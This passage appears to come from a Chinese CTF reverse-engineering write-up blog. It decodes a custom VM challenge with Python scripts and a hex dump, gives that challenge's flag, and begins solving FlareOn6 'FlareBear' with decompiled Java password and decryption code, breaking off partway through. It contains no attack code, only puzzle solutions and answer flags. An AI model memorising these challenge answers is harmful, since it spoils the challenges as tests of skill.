-.......0.......</span><br><span class="line">10096E40 00 00 00 00 00 00 00 00 01 00 00 00 30 09 00 00 ............0...</span><br><span class="line">10096E50 2E 00 00 00 00 00 00 00 70 90 00 10 00 00 00 00 ........p.......</span><br><span class="line">10096E60 00 00 00 00 00 00 00 00 01 00 00 00 F0 0F 00 00 ............ð...</span><br><span class="line">10096E70 2F 00 00 00 ED 33 03 77 C0 90 00 10 00 00 00 00 &#x2F;...í3.wÀ.......</span><br><span class="line">10096E80 00 00 00 00 00 00 00 00 01 00 00 00 70 10 3C 76 ............p.&lt;v</span><br><span class="line">10096E90 30 00 00 00 00 00 79 00 00 91 00 10 00 00 00 00 0.....y.........</span><br><span class="line">10096EA0 00 00 00 00 00 00 00 00 01 00 00 00 7F 00 00 00 ................</span><br><span class="line">10096EB0 31 00 00 00 30 09 00 00 50 91 00 10 00 00 00 00 1...0...P.......</span><br><span class="line">10096EC0 00 00 00 00 00 00 00 00 01 00 00 00 D8 00 00 00 ............Ø...</span><br><span class="line">10096ED0 32 00 00 00 F0 0F 00 00 90 91 00 10 00 00 00 00 2...ð...........</span><br><span class="line">10096EE0 00 00 00 00 00 00 00 00 01 00 00 00 55 A5 08 77 ............U¥.w</span><br><span class="line">10096EF0 33 00 00 00 88 F2 36 00 E0 91 00 10 00 00 00 00 3....ò6.à.......</span><br><span class="line">10096F00 00 00 00 00 00 00 00 00 01 00 00 00 CA DA 07 77 ............ÊÚ.w</span><br><span class="line">10096F10 34 00 00 00 00 00 00 00 20 92 00 10 00 00 00 00 4....... .......</span><br><span class="line">10096F20 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................</span><br></pre></td></tr></table></figure></li>
<li><p>可以看到，前面是一个数字，后面是一系列的地址</p>
</li>
<li><p>vm函数地址为10005960,IDA中的地址为10006560,可以得到基址-c00</p>
</li>
<li><p>继续调试发现，后面调用的函数就是对应位置的函数</p>
</li>
<li><p>调试发现1007f15c不做任何事直接返回</p>
</li>
<li><p>使用脚本处理上面dump出的数据，得到地址。另外opcode和vm_eip都可以分析出</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES,PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># add = []</span></span><br><span class="line"><span class="comment"># with open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     lines = f.readlines()</span></span><br><span class="line"><span class="comment">#     for i in range(0,len(lines),2):</span></span><br><span class="line"><span class="comment">#         l = lines[i][:-1]</span></span><br><span class="line"><span class="comment">#         f = l[0:2][::-1]+l[2:4][::-1]+l[4:6][::-1]+l[6:8][::-1]</span></span><br><span class="line"><span class="comment">#         f = f[::-1]</span></span><br><span class="line"><span class="comment">#         f = int(f,16)</span></span><br><span class="line"><span class="comment">#         print(hex(f))</span></span><br><span class="line"><span class="comment">#         add.append(f+0xc00)</span></span><br><span class="line"><span class="comment"># print(add)</span></span><br><span class="line">add = [<span class="number">0</span>,<span class="number">268477312</span>, <span class="number">268477376</span>, <span class="number">268476832</span>, <span class="number">268476912</span>, <span class="number">268477232</span>, <span class="number">268477152</span>, <span class="number">268476992</span>, <span class="number">268477072</span>, <span class="number">268468608</span>, <span class="number">268468688</span>, <span class="number">268479520</span>, <span class="number">268479600</span>, <span class="number">268477488</span>, <span class="number">268477568</span>, <span class="number">268471312</span>, <span class="number">268471408</span>, <span class="number">268477760</span>, <span class="number">268477840</span>, <span class="number">268482336</span>, <span class="number">268482416</span>, <span class="number">268468848</span>, <span class="number">268468928</span>, <span class="number">268477696</span>, <span class="number">268478944</span>, <span class="number">268479024</span>, <span class="number">268479120</span>, <span class="number">268479200</span>, <span class="number">268470976</span>, <span class="number">268478080</span>, <span class="number">268478144</span>, <span class="number">268477920</span>, <span class="number">268470000</span>, <span class="number">268470096</span>, <span class="number">268470192</span>, <span class="number">268470288</span>, <span class="number">268478832</span>, <span class="number">268476144</span>, <span class="number">268476192</span>, <span class="number">268470672</span>, <span class="number">268470816</span>, <span class="number">268476016</span>, <span class="number">268476080</span>, <span class="number">268476256</span>, <span class="number">268476320</span>, <span class="number">268475440</span>, <span class="number">268475504</span>, <span class="number">268475584</span>, <span class="number">268475648</span>, <span class="number">268475728</span>, <span class="number">268475792</span>, <span class="number">268475872</span>, <span class="number">268475936</span>]</span><br><span class="line"></span><br><span class="line">opc = [<span class="number">1</span>,<span class="number">0</span>,<span class="string">&#x27;strlen(input)&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;v0 - self((int)v4)&#x27;</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">39</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">47</span>,<span class="number">1</span>,<span class="number">54</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">37</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">40</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">20</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">19</span>,<span class="number">4</span>,<span class="number">51</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">37</span>,<span class="number">-28</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">37</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">40</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">37</span>,<span class="number">-28</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;self((int)v4)&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;self((int)v118)&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">28</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">1</span>,<span class="number">54</span>,<span class="number">34</span>,<span class="string">&#x27;self(0x1000A880)&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">54</span>]</span><br><span class="line">eip = <span class="number">0</span></span><br><span class="line">print(len(opc))</span><br><span class="line"><span class="keyword">while</span> eip&lt;len(opc):</span><br><span class="line">    ins = opc[eip]</span><br><span class="line">    print(<span class="string">&#x27;%02x:%02x:&#x27;</span>%(eip,ins),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(<span class="string">&#x27;%X:&#x27;</span>%(add[ins]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ins==<span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;mov to tmp&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown4,maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&#x27;move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">6</span>:</span><br><span class="line">        print(<span class="string">&#x27;move v4&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">7</span>:</span><br><span class="line">        print(<span class="string">&#x27;add maybe&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x14</span>:</span><br><span class="line">        print(<span class="string">&#x27;xor&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x1c</span>:</span><br><span class="line">        print(<span class="string">&#x27;cmp&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x22</span>:</span><br><span class="line">        print(<span class="string">&#x27;real_unknown&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x25</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown3,maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x27</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x29</span>:</span><br><span class="line">        print(<span class="string">&#x27;jump&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x2f</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown2,maybe jump&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x33</span>:</span><br><span class="line">        print(<span class="string">&#x27;maybe jump&#x27;</span>)</span><br><span class="line">    eip+=<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>具体功能需要详细分析vm的结构</p>
<p>解题脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line">v118 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v118[<span class="number">0</span>] = <span class="number">81</span>;</span><br><span class="line">v118[<span class="number">1</span>] = <span class="number">95</span>;</span><br><span class="line">v118[<span class="number">2</span>] = <span class="number">114</span>;</span><br><span class="line">v118[<span class="number">3</span>] = <span class="number">105</span>;</span><br><span class="line">v118[<span class="number">4</span>] = <span class="number">106</span>;</span><br><span class="line">v118[<span class="number">5</span>] = <span class="number">50</span>;</span><br><span class="line">v118[<span class="number">6</span>] = <span class="number">137</span>;</span><br><span class="line">v118[<span class="number">7</span>] = <span class="number">121</span>;</span><br><span class="line">v118[<span class="number">8</span>] = <span class="number">43</span>;</span><br><span class="line">v118[<span class="number">9</span>] = <span class="number">82</span>;</span><br><span class="line">v118[<span class="number">10</span>] = <span class="number">82</span>;</span><br><span class="line">v118[<span class="number">11</span>] = <span class="number">86</span>;</span><br><span class="line">v118[<span class="number">12</span>] = <span class="number">74</span>;</span><br><span class="line">v118[<span class="number">13</span>] = <span class="number">77</span>;</span><br><span class="line">v118[<span class="number">14</span>] = <span class="number">96</span>;</span><br><span class="line">v118[<span class="number">15</span>] = <span class="number">18</span>;</span><br><span class="line">v4 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v4[<span class="number">0</span>] = <span class="number">54</span>;</span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">72</span>;</span><br><span class="line">v4[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">v4[<span class="number">3</span>] = <span class="number">35</span>;</span><br><span class="line">v4[<span class="number">4</span>] = <span class="number">12</span>;</span><br><span class="line">v4[<span class="number">5</span>] = <span class="number">37</span>;</span><br><span class="line">v4[<span class="number">6</span>] = <span class="number">9</span>;</span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">23</span>;</span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">83</span>;</span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">6</span>;</span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">16</span>;</span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">26</span>;</span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">36</span>;</span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">56</span>;</span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">66</span>;</span><br><span class="line"></span><br><span class="line">f = [(v118[i]^v4[i])<span class="number">-2</span>^<span class="number">0x33</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">print(bytes(f))</span><br></pre></td></tr></table></figure>

<p><code>V&amp;N&#123;W&amp;M_Easy_Re&#125;</code></p>
<h2 id="rev-FlareOn6-FlareBear"><a href="#rev-FlareOn6-FlareBear" class="headerlink" title="[rev][FlareOn6]FlareBear"></a>[rev][FlareOn6]FlareBear</h2><ol>
<li><p>FlarebeerActivity</p>
</li>
<li><p>clean看到danceWithFlag可以获取flag，需要的条件为isHappy&amp;&amp;isEcstatic，继续分析条件</p>
</li>
<li><p>getState使用PreferenceManager.getDefaultSharedPreferences获取配置，并且下面有setState</p>
</li>
<li><p>isHappy: getStat(‘f’)/getStat(‘p’)&gt;2.0&amp;&amp;&lt;2.5<br>来自于getPreference(‘activity’,’’)</p>
</li>
<li><p>isEcstatic: getState(‘mass’,0)==72&amp;&amp;getState(‘happy’,0)==30&amp;&amp;getState(‘clean’,0)==0<br>来自于getPreference(argString,argInt)</p>
</li>
<li><p>decrypt函数：pawsitive_vibes!是初始向量，key是NaClNaClNaCl，key填充方式是PBKDF2WithHmacSHA1</p>
</li>
<li><p>getPassword: </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">String str1;</span><br><span class="line">    <span class="keyword">int</span> i = getStat(<span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">    <span class="keyword">int</span> j = getStat(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">    <span class="keyword">int</span> k = getStat(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    String str2 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (i % <span class="number">9</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        str1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        str1 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        str1 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        str1 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        str1 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        str1 = <span class="string">&quot;!&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        str1 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        str1 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        str1 = <span class="string">&quot;-&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        str1 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">switch</span> (k % <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        str2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        str2 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        str2 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        str2 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        str2 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        str2 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        str2 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String str3 = StringsKt.repeat(<span class="string">&quot;flare&quot;</span>, i / k);</span><br><span class="line">    String str4 = StringsKt.repeat(rotN(<span class="string">&quot;bear&quot;</span>, i * j), j * <span class="number">2</span>);</span><br><span class="line">    String str5 = StringsKt.repeat(<span class="string">&quot;yeah&quot;</span>, k);</span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    stringBuilder.append(str3);</span><br><span class="line">    stringBuilder.append(str1);</span><br><span class="line">    stringBuilder.append(str4);</span><br><span class="line">    stringBuilder.append(str2);</span><br><span class="line">    stringBuilder.append(str5);</span><br><span class="line">    <span class="keyword">return</span> stringBuilder.toString();</span><br></pre></td></tr></table></figure>

<p> i/j&gt;2.0&lt;2.5，j=1,i=2,j=2,i=4,j=4,i=8,j=2,i=5<br> flare重复i/k次+str1+</p>
</li>
<li><p>解密资源</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.PBEKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">getPassword</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j,<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        String str1;</span><br><span class="line">        String str2 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span> (i % <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            str1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            str1 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            str1 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            str1 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            str1 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            str1 = <span class="string">&quot;!&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            str1 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            str1 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span 